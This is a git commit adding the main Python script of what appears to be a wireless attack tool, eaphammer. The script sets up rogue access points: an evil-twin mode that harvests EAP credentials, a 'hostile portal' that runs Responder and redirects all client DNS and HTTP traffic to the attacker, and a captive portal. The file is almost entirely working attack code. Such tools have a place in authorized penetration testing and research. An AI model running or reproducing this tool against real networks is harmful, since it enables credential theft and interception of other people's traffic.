385ec4aea5543396e49195b48730c78df503d7c3
s0lst1c3 <gryan@gdssecurity.com>
2017-02-23 18:57:04 -0500

    asdf

---
+++ eaphammer.py
@@ -0,0 +1,266 @@
+import sys
+import os
+import config
+import time
+
+from core import cert_manager, conf_manager, utils, responder
+from argparse import ArgumentParser
+
+def cert_wizard():
+
+    while True:
+
+        print '[*] Please enter two letter country code for certs (i.e. US, FR)'
+        country = raw_input(': ').upper()
+        if len(country) == 2:
+            break
+        print '[!] Invalid input.'
+
+    print '[*] Please enter state or province for certs (i.e. Ontario, New Jersey)'
+    state = raw_input(': ')
+
+    print '[*] Please enter locale for certs (i.e. London, Hong Kong)'
+    locale = raw_input(': ')
+
+    print '[*] Please enter organization for certs (i.e. Evil Corp)'
+    org = raw_input(': ')
+
+    print '[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)'
+    email = raw_input(': ')
+
+    print '[*] Please enter common name (CN) for certs.'
+    cn = raw_input(': ')
+
+    cert_manager.ca_cnf.configure(country, state, locale, org, email, cn)
+    cert_manager.server_cnf.configure(country, state, locale, org, email, cn)
+    cert_manager.client_cnf.configure(country, state, locale, org, email, cn)
+
+    cert_manager.bootstrap()
+
+def hostile_portal():
+    global responder
+
+    try:
+        # prepare environment
+        utils.NetworkManager.stop()
+        utils.wlan_clean()
+        utils.set_ipforward(1)
+
+        # initialize access point
+        if options['auth'] == 'open':
+            conf_manager.hostapd_open_cnf.configure(interface=options['interface'],
+                                            ssid=options['essid'],
+                                            hw_mode=options['hw_mode'],
+                                            bssid=options['bssid'],
+                                            channel=options['channel'])
+        else:
+            conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
+                                            ssid=options['essid'],
+                                            hw_mode=options['hw_mode'],
+                                            bssid=options['bssid'],
+                                            channel=options['channel'],
+                                            wpa=options['wpa'])
+        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf)
+
+        # configure routing 
+        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
+        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
+
+        # start dhcp and dns: all dns queries should resolve to PHY
+        utils.Dnsmasq.hardstart('-C %s' % config.dnsmasq_cnf)
+        utils.Dnsspoof.hardstart('-i %s -f %s' % (options['interface'], config.dnsspoof_cnf))
+
+        # start Responder
+        responder = responder.Responder.get_instance()
+        responder.configure()
+        responder.start()
+        
+
+        # set iptables policy, flush all tables for good measure
+        utils.Iptables.accept_all()
+        utils.Iptables.flush()
+        utils.Iptables.flush('nat')
+
+        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
+        utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
+        utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])
+
+        # pause execution until use quits
+        raw_input('press enter to quit...')
+
+    except KeyboardInterrupt:
+    
+        # kill daemons
+        utils.Hostapd.kill()
+        utils.Dnsmasq.kill()
+        utils.Dnsspoof.kill()
+        
+        # restore iptables to a clean state (policy, flush tables)
+        utils.Iptables.accept_all()
+        utils.Iptables.flush()
+        utils.Iptables.flush('nat')
+
+def captive_portal():
+
+    try:
+        # prepare environment
+        utils.NetworkManager.stop()
+        utils.wlan_clean()
+        utils.set_ipforward(1)
+
+        # initialize access point
+        if options['auth'] == 'open':
+            conf_manager.hostapd_open_cnf.configure(interface=options['interface'],
+                                            ssid=options['essid'],
+                                            hw_mode=options['hw_mode'],
+                                            bssid=options['bssid'],
+                                            channel=options['channel'])
+        else:
+            conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
+                                            ssid=options['essid'],
+                                            hw_mode=options['hw_mode'],
+                                            bssid=options['bssid'],
+                                            channel=options['channel'],
+                                            wpa=options['wpa'])
+        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf)
+
+        # configure routing 
+        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
+        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
+
+        # start dhcp and dns: all dns queries should resolve to PHY
+        utils.Dnsmasq.hardstart('-C %s' % config.dnsmasq_cnf)
+        utils.Dnsspoof.hardstart('-i %s -f %s' % (options['interface'], config.dnsspoof_cnf))
+
+        # set iptables policy, flush all tables for good measure
+        utils.Iptables.accept_all()
+        utils.Iptables.flush()
+        utils.Iptables.flush('nat')
+
+        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
+        utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
+        utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])
+        
+        # pause execution until use quits
+        raw_input('press enter to quit...')
+
+    except KeyboardInterrupt:
+
+        # kill daemons
+        utils.Hostapd.kill()
+        utils.Dnsmasq.kill()
+        utils.Dnsspoof.kill()
+        
+        # restore iptables to a clean state (policy, flush tables)
+        utils.Iptables.accept_all()
+        utils.Iptables.flush()
+        utils.Iptables.flush('nat')
+
+def reap_creds():
+    conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
+                                    ssid=options['essid'],
+                                    hw_mode=options['hw_mode'],
+                                    bssid=options['bssid'],
+                                    channel=options['channel'],
+                                    wpa=options['wpa'])
+    utils.Hostapd.hardstart(config.hostapd_cnf)
+
+    # pause execution until use quits
+    raw_input('press enter to quit...')
+
+    utils.Hostapd.kill()
+
+def set_options():
+
+
+    parser = ArgumentParser()
+
+    parser.add_argument('--cert-wizard',
+                    dest='cert_wizard',
+                    action='store_true',
+                    help='Use this flag to create a new RADIUS cert for your AP')
+
+    parser.add_argument('-i', '--interface',
+                    dest='interface',
+                    type=str,
+                    help='The phy interface on which to create the AP')
+
+    parser.add_argument('-e', '--essid',
+                    dest='essid',
+                    default='eaphammer',
+                    type=str,
+                    help='Specify access point ESSID')
+
+    parser.add_argument('-b', '--bssid',
+                    dest='bssid',
+                    default='00:11:22:33:44:00',
+                    type=str,
+                    help='Specify access point BSSID')
+
+    parser.add_argument('--hw-mode',
+                    dest='hw_mode',
+                    type=str,
+                    default='g',
+                    help='Specify access point hardware mode (default: g).')
+
+    parser.add_argument('-c', '--channel',
+                    dest='channel',
+                    type=int,
+                    default=1,
+                    help='Specify access point channel')
+
+    parser.add_argument('--wpa',
+                    dest='wpa',
+                    type=int,
+                    choices=[1, 2],
+                    default=2,
+                    help='Specify WPA type (default: 2).')
+
+    parser.add_argument('--auth',
+                    dest='auth',
+                    type=str,
+                    choices=['peap', 'ttls', 'open'],
+                    default='open',
+                    help='Specify auth type (default: open).')
+
+    parser.add_argument('--creds',
+                    dest='reap_creds',
+                    action='store_true',
+                    help='Harvest EAP creds using evil twin attack')
+
+    parser.add_argument('--hostile-portal',
+                    dest='hostile_portal',
+                    action='store_true',
+                    help='Force clients to connect to hostile portal')
+
+    parser.add_argument('--captive-portal',
+                    dest='captive_portal',
+                    action='store_true',
+                    help='Force clients to connect to a captive portal')
+
+    args = parser.parse_args()
+
+    options = args.__dict__
+
+    if options['cert_wizard'] == False:
+
+        if options['interface'] is None:
+        
+
+            print 'Please specify a valid PHY interface using the --interface flag'
+            sys.exit()
+
+    return options
+
+if __name__ == '__main__':
+
+    options = set_options()
+
+    if options['cert_wizard']:
+        cert_wizard()
+    elif options['captive_portal']:
+        captive_portal()
+    elif options['hostile_portal']:
+        hostile_portal()
+    else:
+        reap_creds()
